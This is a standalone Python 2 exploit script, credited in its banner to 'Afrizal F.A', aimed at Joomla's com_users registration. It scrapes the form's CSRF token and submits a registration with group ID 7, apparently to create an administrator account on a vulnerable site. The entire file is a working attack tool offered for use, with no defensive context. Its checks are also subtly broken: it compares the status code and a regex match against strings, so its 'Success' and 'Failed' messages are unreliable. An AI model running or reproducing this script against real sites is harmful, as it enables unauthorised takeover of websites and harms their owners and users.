#!/usr/bin/python
# Coded By Afrizal F.A

import re, sys, requests

print """
  ____ ___                      _____
 / ___/ _ \ _ __ ___  _   _ ___|___ / _ __
| |  | | | | '_ ` _ \| | | / __| |_ \| '__|
| |__| |_| | | | | | | |_| \__ \___) | |
 \____\___/|_| |_| |_|\__,_|___/____/|_|

By : Afrizal F.A
"""

web=sys.argv[1]
target=web + "/index.php?option=com_users&view=registration"
user=sys.argv[2]
passwd=sys.argv[3]
email=sys.argv[4]

exp=requests.get(url=target)
print "[*] Check Connection : " + web

if not exp.status_code == "200" :
    isi=exp.content
    regex='<input type="hidden" name="(.*?)" value="1"'
    noken=re.findall(regex,isi)
    token=noken[0]
    print "[+] Token : " + token
    pyld={
    "jform[name]" : user,
    "jform[username]" : user,
    "jform[password1]" : passwd,
    "jform[password2]" : passwd,
    "jform[email1]" : email,
    "jform[email2]" : email,
    "jform[groups][]" : "7",
    "option" : "com_users",
    "task" : "registration.register",
    token : "1"
    }
    print "[*] Exploiting : " + target
    exp=requests.post(url=target, data=pyld, cookies=exp.cookies, headers={ "referer" : target, "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" }, verify=False, allow_redirects=True)
    raw_cek=exp.content
    cek=re.search("created",raw_cek)
    if cek == "None" :
        print "[+] Exploit Status : Success"
    else :
        print "[-] Exploit Status : Failed"
